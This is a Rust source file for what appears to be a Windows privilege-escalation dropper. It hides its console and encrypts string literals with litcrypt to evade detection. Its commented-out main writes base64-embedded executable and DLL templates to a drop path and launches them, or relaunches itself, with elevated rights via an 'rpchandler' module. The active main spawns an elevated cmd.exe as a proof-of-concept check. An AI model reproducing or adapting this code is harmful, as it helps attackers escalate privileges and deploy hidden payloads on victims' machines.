#![windows_subsystem = "windows"]
#[macro_use]
extern crate litcrypt;
use_litcrypt!();

// use std::env;
// use std::io::Write;

// use std::ptr::null_mut;
// use winapi::um::handleapi::CloseHandle;
// use winapi::um::processthreadsapi::GetCurrentProcess;
// use winapi::um::processthreadsapi::OpenProcessToken;
// use winapi::um::securitybaseapi::GetTokenInformation;
// use winapi::um::winnt::TokenElevation;
// use winapi::um::winnt::HANDLE;
// use winapi::um::winnt::TOKEN_ELEVATION;
// use libc;
// use std::mem;
// use winapi::ctypes::c_void;
// use winapi::um::winnt::TOKEN_QUERY;

// fn is_elevated() -> bool {

//     let mut handle: HANDLE = null_mut();
//     unsafe { OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut handle) };

//     let elevation = unsafe { libc::malloc(mem::size_of::<TOKEN_ELEVATION>()) as *mut c_void };
//     let size = std::mem::size_of::<TOKEN_ELEVATION>() as u32;
//     let mut ret_size = size;
//     unsafe {
//         GetTokenInformation(
//             handle,
//             TokenElevation,
//             elevation,
//             size as u32,
//             &mut ret_size,
//         )
//     };
//     let elevation_struct: TOKEN_ELEVATION = unsafe{ *(elevation as *mut TOKEN_ELEVATION)};

//     if !handle.is_null() {
//         unsafe {
//             CloseHandle(handle);
//         }
//     }

//     elevation_struct.TokenIsElevated == 1

// }

// fn get_b64_exe() -> String {
//   let b64_exe = lc!("%Base64Executable%").to_owned();
//   b64_exe
// }

// fn get_b64_dll() -> String {
//     let b64_dll = lc!("%Base64Dll%").to_owned();
//     b64_dll
// }


// fn main() 
// {
//     if is_elevated(){
//         std::fs::File::create(lc!("%DropPath%\\%ExecutableName%")).expect(&lc!("write failed")).write_all(&base64::decode(get_b64_exe().to_owned()).unwrap().to_owned()).expect(&lc!("write failed"));
//         std::fs::File::create(lc!("%DropPath%\\%DllName")).expect(&lc!("write failed")).write_all(&base64::decode(get_b64_dll().to_owned()).unwrap().to_owned()).expect(&lc!("write failed"));
//         if rpchandler::spawn_elevated_process(lc!("%DropPath%\\%ExecutableName%"), true){
//             // println!("{}", lc!("[!] Elevated process spawned!"));
//         }
//     } else { 
//         match env::current_exe() {
//             Ok(exe_path) => if rpchandler::spawn_elevated_process(exe_path.display().to_string(), true){
//                 // println!("{}", lc!("[!] Elevated process spawned!"));
//             },
//             Err(e) => println!(" [!] Failed to get current exe path: {e}"),
//         };
        
//     }
   
// }

fn main() 
{
    if rpchandler::spawn_elevated_process("C:\\Windows\\System32\\cmd.exe /c \"whoami /groups | find \"S-1-16-12288\" && echo Elevated Priviledges && pause\"".to_string(), true){
        // println!("{}", lc!("[!] Elevated process spawned!"));
    }
   
}